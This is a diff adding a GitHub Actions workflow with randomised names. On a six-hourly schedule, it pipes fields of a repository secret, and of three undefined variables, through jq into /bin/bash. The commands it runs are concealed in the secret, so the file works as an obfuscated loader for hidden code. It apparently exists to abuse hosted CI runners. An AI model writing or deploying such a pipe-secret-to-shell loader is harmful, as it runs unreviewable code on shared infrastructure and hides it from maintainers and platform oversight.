@@ -1,0 +1,19 @@
+name: ivantravisfwing37
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ivantravisfwing37
+        env:
+          nppak91: ${{ secrets.nppak91 }}
+        run: |
+          echo $nppak91 | jq -r .zg84 | /bin/bash
+          echo $s50427 | jq -r .k5746 | /bin/bash
+          echo $ykty5608 | jq -r .flyu0 | /bin/bash
+          echo $sw6 | jq -r .bmxj1 | /bin/bash
+
